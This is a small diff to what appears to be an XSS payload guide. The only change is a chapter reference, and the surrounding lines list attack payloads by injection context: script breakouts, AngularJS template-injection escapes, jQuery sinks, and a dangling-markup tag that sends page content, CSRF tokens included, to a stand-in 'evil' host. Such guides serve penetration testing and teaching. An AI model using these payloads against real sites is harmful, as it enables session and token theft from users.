@@ -20,7 +20,7 @@ Identify the reflection context first, then choose payload shape:
 - **Inside a `<script>`/event-handler with encoding**: angle brackets may be encoded but quotes/backslashes survive → `\'-alert(1)-\'`, `</script>`-breakout variants.
 - **Client-side template injection (CSTI)**: AngularJS-era `{{7*7}}`/`{{constructor.constructor('alert(1)')()}}` — sandbox escapes version-dependent.
 - **Dangling markup**: no full XSS, but inject an unclosed tag (`<img src='//evil/?`) so the *rest of the page* (including CSRF tokens) is sent to your URL — exfil-adjacent data theft without script execution.
-- **jQuery/other sinks**: `$()`, `.html()`, `attr()`, location.hash-driven selectors — version-dependent gadgets (see `ch05` + `xss-cheat-sheet`).
+- **jQuery/other sinks**: `$()`, `.html()`, `attr()`, location.hash-driven selectors — version-dependent gadgets (see `ch05-dom-attacks.md` + `xss-cheat-sheet`).
 
 ## CSP & evasion
 
